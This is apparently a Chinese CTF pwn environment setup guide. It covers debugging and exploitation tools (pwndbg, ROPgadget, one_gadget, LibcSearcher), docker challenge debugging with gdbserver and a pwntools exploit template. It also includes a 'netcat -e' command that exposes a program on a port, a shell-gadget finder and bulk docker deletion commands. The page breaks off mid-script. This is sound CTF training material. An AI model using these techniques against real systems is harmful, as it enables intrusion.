<code>source</code> 根目录下的 <code>autoreconf</code> 的配置文件
<code>configure.ac</code>
配置有问题，需要改成以下内容（这个主要看版本，有时默认的就好使)：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">GLIBC_PROVIDES dnl See aclocal.m4 <span class="keyword">in</span> the top level <span class="built_in">source</span> directory.</span><br><span class="line"><span class="comment"># Local configure fragment for sysdeps/i386.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We no longer support i386 since it lacks the atomic instructions</span></span><br><span class="line"><span class="comment"># required to implement NPTL threading.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$config_machine</span>&quot;</span> = i386; <span class="keyword">then</span></span><br><span class="line">  AC_MSG_ERROR([</span><br><span class="line">*** ERROR: Support <span class="keyword">for</span> i386 is deprecated.</span><br><span class="line">*** Please use host i786, i686, i585 or i486.</span><br><span class="line">*** For example: /src/glibc/configure --host=i686-pc-linux-gnu ...<span class="string">&quot;])</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># The GNU C Library can&#x27;t be built for i386.  There are several reasons for</span></span><br><span class="line"><span class="string"># this restriction.  The primary reason is that i386 lacks the atomic</span></span><br><span class="line"><span class="string"># operations required to support the current NPTL implementation.  While it is</span></span><br><span class="line"><span class="string"># possible that such atomic operations could be emulated in the kernel to date</span></span><br><span class="line"><span class="string"># no such work has been done to enable this.  Even with NPTL disabled you still</span></span><br><span class="line"><span class="string"># have no atomic.h implementation.  Given the declining use of i386 we disable</span></span><br><span class="line"><span class="string"># support for building with `-march=i386&#x27; or `-mcpu=i386.&#x27; We don&#x27;t explicitly</span></span><br><span class="line"><span class="string"># check for i386, instead we make sure the compiler has support for inlining</span></span><br><span class="line"><span class="string"># the builtin __sync_val_compare_and_swap. If it does then we should have no</span></span><br><span class="line"><span class="string"># problem building for i386.</span></span><br><span class="line"><span class="string">LIBC_COMPILER_BUILTIN_INLINED(</span></span><br><span class="line"><span class="string">  [__sync_val_compare_and_swap],</span></span><br><span class="line"><span class="string">  [int a, b, c; __sync_val_compare_and_swap (&amp;a, b, c);],</span></span><br><span class="line"><span class="string">  [-O0],</span></span><br><span class="line"><span class="string">  [libc_cv_unsupported_i386=no],</span></span><br><span class="line"><span class="string">  [AC_MSG_ERROR([</span></span><br><span class="line"><span class="string">*** Building with -march=i386/-mcpu=i386 is not supported.</span></span><br><span class="line"><span class="string">*** Please use host i786, i686, i586, or i486.</span></span><br><span class="line"><span class="string">*** For example: /source/glibc/configure CFLAGS=&#x27;-O2 -march=i686&#x27; ...])])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl Check whether asm supports Intel MPX</span></span><br><span class="line"><span class="string">AC_CACHE_CHECK(for Intel MPX support, libc_cv_asm_mpx, [dnl</span></span><br><span class="line"><span class="string">cat &gt; conftest.s &lt;&lt;\EOF</span></span><br><span class="line"><span class="string">        bndmov %bnd0,(%esp)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="string">if AC_TRY_COMMAND(<span class="variable">$&#123;CC-cc&#125;</span> -c <span class="variable">$ASFLAGS</span> conftest.s 1&gt;&amp;AS_MESSAGE_LOG_FD); then</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=yes</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=no</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">rm -f conftest*])</span></span><br><span class="line"><span class="string">if test <span class="variable">$libc_cv_asm_mpx</span> == yes; then</span></span><br><span class="line"><span class="string">  AC_DEFINE(HAVE_MPX_SUPPORT)</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AC_DEFINE(USE_REGPARMS)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl It is always possible to access static and hidden symbols in an</span></span><br><span class="line"><span class="string">dnl position independent way.</span></span><br><span class="line"><span class="string">AC_DEFINE(PI_STATIC_AND_HIDDEN)</span></span><br></pre></td></tr></table></figure></div>
<p>另外还需要右键 Makefile 设置在命令后面添加
<code>--disable-sanity-checks</code> 。另外构建目标要填 <code>all</code>
，否则 clion 分析的源码的不全。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241107232825793.png"
                     
alt="image-20241107232825793" 
                > 完整预配置命令如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># GNU Autotools template, feel free to customize.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">which</span> autoreconf &gt;/dev/null &amp;&amp; autoreconf --install --force --verbose <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>&quot;</span> 2&gt;&amp;1; /bin/sh <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>/configure&quot;</span> --disable-sanity-checks</span><br></pre></td></tr></table></figure></div>
<p>之后右键重新加载 Makefile 项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241107232847285.png"
                     
alt="image-20241107232847285" 
                > 不勾选清理项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241107232907035.png"
                     
alt="image-20241107232907035" 
                >
如果最后这样说明导入成功，之后耐心等待项目导入完毕即可。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241107232925754.png"
                     
alt="image-20241107232925754" 
                >
<figcaption aria-hidden="true">image-20241107232925754</figcaption>
</figure>
<h3 id="gdb">gdb</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></div>
<h3 id="pwntools">pwntools</h3>
<p>注意我这里的 pwntools 是 python2 版本的，需要指定为 4.9.0
，因为高版本的 pwntools 已经不支持 python2 了（具体来说是高版本的
pwntools 必须依赖 unicorn 2.x.x ，而 unicorn 2.x.x 只支持 python3）。
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools==4.10.0 -i https://pypi.tuna.tsinghua.edu.cn/simple </span><br></pre></td></tr></table></figure></div> 如果已经装了 pwntools
需要先卸载干净再重新安装，否则更改版本无效（最好不带 <code>sudo</code>
也来一遍确保卸载干净）。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 uninstall pwntools</span><br><span class="line"><span class="built_in">sudo</span> pip2 uninstall unicorn</span><br></pre></td></tr></table></figure></div> 这样安装的 pwntools 的 plt
功可能无法正常使用，需要手动安装 Unicorn 库。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install unicorn==1.0.3 -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div>
<p>当然这样做的代价是一些特殊架构老版本的 pwntools 不支持，这时候最好换
python3 的 pwntools 。 ### gdb 插件 主要有 pwndbg，peda，gef
，这里我常用的是 pwndbg
。对于一些版本过于古老导致环境装不上的可以尝试一下 peda 。</p>
<p>先将三个项目的代码都拉取下来。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git</span><br></pre></td></tr></table></figure></div> pwndbg
需要运行初始化脚本。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line"><span class="built_in">sudo</span> ./setup.sh</span><br></pre></td></tr></table></figure></div>
<p>另外还有一个 pwngdb 插件在调试多线程堆（<code>heapinfoall</code>
命令）的时候很有用，建议安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure></div>
<p>gdb 在启动的时候会读取当前用户的主目录的 <code>.gdbinit</code>
文件进行 gdb 插件的初始化，这里提供一个配置方案。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/sky123/tools/pwndbg/gdbinit.py </span><br><span class="line"><span class="comment">#source /home/sky123/tools/peda/peda.py</span></span><br><span class="line"><span class="comment">#source /home/sky123/tools/gef/gef.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /home/sky123/tools/muslheap/muslheap.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/pwngdb.py</span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li>以普通用权限和管理员权限启动 gdb 时读取的 <code>.gdbinit</code>
文件的路径是不同的，普通权限读取的是
<code>/home/&lt;username&gt;/.gdbinit</code> 而管理员权限读取的是
<code>/root/.gdbinit</code> 。</li>
<li>上述配置方案是为了使用 <code>Pwngdb</code>
插件，而该插件唯一的作用就是打印每个线程的对应的
<code>tcache</code>，而实际上这个库已经很久不维护了，因此建议还是直接
<code>source /home/sky123/tools/pwndbg/gdbinit.py</code>。</li>
</ul>

    </div>
  </div></p>
<p>pwndbg 安装 ghidra 插件可以支持代码反编译（<del>虽然没啥用</del> ） -
安装 <code>r2pipe</code> 库 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install r2pipe</span><br></pre></td></tr></table></figure></div> - 下载安装 radere2 项目
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/radare2.git</span><br><span class="line"><span class="built_in">cd</span> radare2</span><br><span class="line"><span class="built_in">sudo</span> sys/install.sh</span><br></pre></td></tr></table></figure></div> - 下载编译安装 r2ghidra 项目 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/r2ghidra.git</span><br><span class="line"><span class="built_in">cd</span> r2ghidra</span><br><span class="line"><span class="built_in">sudo</span> ./preconfigure</span><br><span class="line"><span class="built_in">sudo</span> ./configure</span><br><span class="line"><span class="built_in">sudo</span> make -j16</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div> ### gadget
搜索工具 #### ROPgdbget 安装： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div> 使用： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ntdll.dll &gt; rop</span><br></pre></td></tr></table></figure></div>
有时候 <code>ROPgadget</code> 会出现如下报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary init_60D_fwf &gt; rop</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/bin/ROPgadget&quot;</span>, line 12, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    ropgadget.main()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/__init__.py&quot;</span>, line 30, <span class="keyword">in</span> main</span><br><span class="line">    sys.exit(0 <span class="keyword">if</span> Core(args.getArgs()).analyze() <span class="keyword">else</span> 1)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 257, <span class="keyword">in</span> analyze</span><br><span class="line">    self.__getGadgets()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 70, <span class="keyword">in</span> __getGadgets</span><br><span class="line">    G = Gadgets(self.__binary, self.__options, self.__offset)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/gadgets.py&quot;</span>, line 24, <span class="keyword">in</span> __init__</span><br><span class="line">    <span class="keyword">elif</span> self.__arch == CS_ARCH_ARM64:</span><br><span class="line">NameError: name <span class="string">&#x27;CS_ARCH_ARM64&#x27;</span> is not defined. Did you mean: <span class="string">&#x27;CS_ARCH_ARM&#x27;</span>?</span><br></pre></td></tr></table></figure></div>
<p>此时需要重新安装 <code>capstone</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip uninstall capstone</span><br><span class="line"><span class="built_in">sudo</span> pip install capstone</span><br></pre></td></tr></table></figure></div>
<h4 id="ropper">ropper</h4>
<ul>
<li><p>安装：</p>
<ul>
<li>在 pypi 的 <a class="link"   href="https://pypi.org/project/ropper/#files" >ropper
官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上下载 ropper</li>
<li>运行安装脚本完成 ropper 安装 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div></li>
</ul></li>
<li><p>使用： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div> #### one_gadget 用于搜索 libc 中能够实现
<code>execve("/bin/sh", (char *[2]) &#123;"/bin/sh", NULL&#125;, NULL);</code>
的效果的跳转地址，由于是采用特征匹配的方法，因此只能是在 libc
中查找。</p></li>
<li><p>安装： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y ruby ruby-dev</span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>使用：可以查找到 gadget 地址以及条件限制。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x50a37 posix_spawn(rsp+0x1c, <span class="string">&quot;/bin/sh&quot;</span>, 0, rbp, rsp+0x60, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbp == NULL || (u16)[rbp] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf1 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf5 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xebcf8 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure></div> 如果
<code>one_gadget</code> 在一个版本的 Ubuntu 中搜索某一版本的 glibc 的
gadget 出现如下报错可以尝试换另一个版本的 Ubuntu
。貌似是权限问题，可以以 root 权限重新装一下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241107233247289.png"
                     
alt="image-20241107233247289" 
                > ### seccomp-tools
用于查看和生成程序沙箱规则。</p></li>
<li><p>安装： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>使用： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure></div> ### LibcSearcher 通过泄露的 libc
中函数的地址来确定 libc 版本。</p></li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div>
<h3 id="glibc-all-in-one">glibc-all-in-one</h3>
<p>临时找 glibc 和 ld 或者编译 glibc 。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br></pre></td></tr></table></figure></div> 更新下载列表：
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  glibc-all-in-one ./update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> list</span><br><span class="line">2.23-0ubuntu10_amd64</span><br><span class="line">2.23-0ubuntu10_i386</span><br><span class="line">2.23-0ubuntu11_amd64</span><br><span class="line">2.23-0ubuntu11_i386</span><br><span class="line">2.23-0ubuntu3_amd64</span><br><span class="line">2.23-0ubuntu3_i386</span><br><span class="line">2.27-3ubuntu1_amd64</span><br><span class="line">2.27-3ubuntu1_i386</span><br><span class="line">2.28-0ubuntu1_amd64</span><br><span class="line">2.28-0ubuntu1_i386</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> old_list</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div> 下载 libc ，注意要安装解压工具 <code>zstd</code>
，因为下载脚本中用到了。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install zstd</span><br><span class="line"><span class="built_in">cat</span> list |xargs -i ./download &#123;&#125;</span><br><span class="line"><span class="built_in">cat</span> old_list |xargs -i ./download_old &#123;&#125;</span><br></pre></td></tr></table></figure></div> 编译 libc</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./build [版本例如2.29] [架构例如 i686 amd64]</span><br></pre></td></tr></table></figure></div>
<h3 id="patchelf">patchelf</h3>
<p>安装： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure></div> ### qemu <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu-user qemu-system </span><br></pre></td></tr></table></figure></div> # 如何使用题目提供的
docker 环境 ## netcat 在<a class="link" 
 href="https://netcat.sourceforge.net/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令进行编译。
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./configure LDFLAGS=-static <span class="comment"># 考虑到 docker 环境恶劣选择静态编译</span></span><br><span class="line">make -j24 <span class="comment"># 编译</span></span><br></pre></td></tr></table></figure></div> 编译后生成的 <code>netcat</code> 位于项目
<code>src</code> 目录下。<code>netcat</code> 即我们常用的
<code>nc</code> 命令对应的可执行程序。</p>
<p>在 docker 中使用如下命令将题目 io 映射到 8888 端口。
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div></p>
<p>在本机可以使用如下命令连接并交互。（前提是 docker 的 8888
端口映射到本机的 8888 端口） <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 8888</span><br></pre></td></tr></table></figure></div> ## gdb 在<a class="link" 
 href="https://www.sourceware.org/gdb/download/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令编译
gdbserver ： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install libgmp-dev libmpfr-dev</span><br><span class="line"><span class="built_in">cd</span> gdb-9.2/gdb/gdbserver</span><br><span class="line">./configure LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div> 对于 gdb ，由于编译 gdb
时依赖的静态库需要提前编译，因此想要编译 gdb 最好直接编译整个项目：
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gdb-9.2</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../configure   LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div></p>
<p>注意以下几点： - 编译的 <code>gdbserver</code> 版本一定要与本机的
<code>gdb</code> 匹配，不同版本的 <code>gdbserver</code> 通信协议不同。
- 有的时候在 <code>gdbserver</code> 中运行 <code>./configuer</code>
命令会出现找不到 <code>Makefile</code>
的情况，这时在根目录进行一次编译就好了。 -
连接失败之后再运行一次编译命令就可能编译成功。 - <code>gdb</code> 位于
<code>./gdb/gdb</code> 中。 - <code>gdbserver</code> 位于
<code>./gdbserver/gdbserver</code> 中。</p>
<h2 id="docker">docker</h2>
<ul>
<li>加载镜像 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker load -i 题目附件.tar</span><br></pre></td></tr></table></figure></div></li>
<li>查看现有镜像 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure></div></li>
<li>启动容器 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged -it -w /home/ctf -v ~/Desktop/本机目录:/home/ctf/镜像目录 -p 8888:8888 -p 9999:9999 镜像名 /bin/bash </span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>--privileged</code>：加这个参数才能 <code>gdbserver</code>
附加进程远程调试</li>
<li><code>-v</code>：目录映射，方便传文件。</li>
<li><code>-p</code>：端口映射，开两个端口分别给 <code>netcat</code> 和
<code>gdbserver</code> 用。改用 <code>--net=host</code>
可以映射全部端口。</li>
<li><code>-w</code>：进入 docker 后目录为 <code>/home/ctf</code> 。</li>
</ul></li>
<li>查看现有容器 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure></div></li>
<li>进容器 shell ，即同一个容器再开一个 shell 。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it -w /home/ctf 容器ID /bin/bash</span><br></pre></td></tr></table></figure></div></li>
<li>停止所有容器： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有容器： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有镜像： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure></div> ## 使用方法 <code>exp.py</code>
模板如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>) <span class="comment"># nc 连接远程程序</span></span><br><span class="line"></span><br><span class="line">gdb.attach(target=(<span class="string">&quot;localhost&quot;</span>, <span class="number">9999</span>), exe=<span class="string">&quot;./pwn&quot;</span>, gdbscript=<span class="string">&quot;&quot;</span>) <span class="comment"># gdb 连接 docker 中的 gdbserver 调试 ./pwn</span></span><br><span class="line"></span><br><span class="line">pause() <span class="comment"># 阻塞脚本直到 gdb 成功连接 gdbserver防止程序跑飞</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">r.sendlineafter(&quot;xxxx&quot;, &quot;xxx&quot;) # 脚本远程交互</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div></li>
<li>运行脚本前首先在 docker 容器中用 <code>netcat</code> 将题目程序 IO
映射到 8888 端口： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div></li>
<li>运行脚本，阻塞在 <code>gdb.attach</code> 时脚本已经与远程的
<code>netcat</code> 连接，此时 docker 镜像中已经有 <code>pwn</code>
这个进程了。此时使用 <code>ps -aux | grep pwn</code> 查看进程
<code>pid</code> 然后运行如下命令让 <code>gdbserver</code>
附加进程并监听 9999 端口。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdbserver :9999 --attach 进程pid</span><br></pre></td></tr></table></figure></div></li>
<li>此时脚本执行 <code>gdb.attach</code> 连接 docker 中的
<code>gdbserver</code> 并阻塞在 <code>pause()</code> 上直到
<code>gdb</code> 成功连接 <code>gdbserver</code> 。</li>
<li>在脚本运行窗口按回车解除阻塞进行调试。</li>
</ul>
<p>其中 docker 中的操作可以通过脚本自动化实现。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IMAGE_NAME=minipy-debug</span><br><span class="line">CONTAINER_HOME=/home/ctf</span><br><span class="line">PROG_NAME=minipy</span><br><span class="line">NC_PORT=8888</span><br><span class="line">DBG_PORT=9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># load image</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker images | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    docker load -i <span class="variable">$&#123;IMAGE_NAME&#125;</span>.tar</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start continer</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker ps | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#   docker run --privileged -itd -p $&#123;DBG_PORT&#125;:$&#123;DBG_PORT&#125; -p $&#123;NC_PORT&#125;:$&#123;NC_PORT&#125; $&#123;IMAGE_NAME&#125;</span></span><br><span class="line">    docker run --privileged -itd --net=host <span 